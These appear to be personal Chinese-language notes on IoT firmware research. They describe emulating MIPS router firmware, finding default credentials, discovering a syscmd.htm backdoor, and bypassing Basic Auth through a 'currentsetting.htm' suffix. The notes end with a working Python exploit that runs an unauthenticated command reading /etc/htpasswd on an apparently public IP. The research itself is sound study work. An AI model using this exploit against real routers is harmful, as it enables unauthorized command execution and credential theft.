# 基础信息收集
binwalk看一下，是个MIPS的大端序，文件系统是squashfs的
![[b6f6302f13cdaf1136d00766420f3e3.png]]
用FirmAE调试模式模拟这个固件，输入2是可以直接进入到shell模式的
![[Pasted image 20240724205358.png]]
去访问192.168.0.1，发现要输入账号和密码，测试了一些常规的默认密码都不对
![[9655cdfcd7cf04831c31b82fc829e83.png]]
于是想着去看一下启动项
![[51945e2ffa456356c9bf368846fdcc5.png]]
查找了一下，去rcS看了一下里面的内容，发现它启动了rc这个二进制文件，打开rc这个二进制文件，搜索了一下password这个字符串，看到它是写在/etc/htpasswd
![[5c2f720f68aae69bd511186df4f77a7.png]]
在shell模式下，cat ./etc/htpasswd发现了初始用户名和密码
![[3b974a4c737816ecdda707cad9cac87.png]]

ps:轩尼诗道师傅的方法
直接在文件中搜索default找到位置，cat 一下就看到了
![[Pasted image 20240724210253.png]]
ps:longlong师傅的方法
firmwalk之后看到关键字password下面的hpasswd.htm直接访问，有提示初始密码是password，那么初始用户名试一下就出来了
![[Pasted image 20240724210654.png]]

再查看一下目录结构，发现这俩个奇怪的.htm文件，直接访问一下
![[Pasted image 20240724212102.png]]
发现在访问到192.168.0.1/syscmd.htm时发现这不是妥妥的小后门嘛
![[Pasted image 20240724212336.png]]

# 后门玩成未授权
既然有了后门，尝试一下它能不能不授权就执行嘞
burp抓一下，看到有BA认证，直接给它删了看看行不行，显然不行
![[Pasted image 20240724213440.png]]
跳到了401，说明在服务器上处理了这个cgi，于是应该去看一下这个固件mini_httpd二进制分析一下
（正常来说应该，下载相同版本的源码，编译后bindiff查看有什么不同，才学疏浅的原因操作不来）
直接定位到不同的地方
![[Pasted image 20240725095737.png]]
定位到这里发现它的值会从1变到0，并且会将其传入后续函数
![[Pasted image 20240725095934.png]]
这个函数里面的内容就是处理密码校验、BA认证等操作，才学疏浅还没分析明白

# exp
```
import requests

ip = "197.246.12.117"

cmd = "cat etc/htpasswd"

payload = "currentsetting.htm"

burp0_url = "http://"+ip+":80/setup.cgi?todo=syscmd&cmd="+cmd+"&curpath=/&"+payload+""

burp0_headers = {"Accept": "*/*", "Referer": "http://"+ip+"/syscmd.htm"}

response = requests.get(burp0_url, headers=burp0_headers)

print(response.text)
```
![[Pasted image 20240724232305.png]]![[Pasted image 20240724232414.png]]
![[Pasted image 20240724232541.png]]
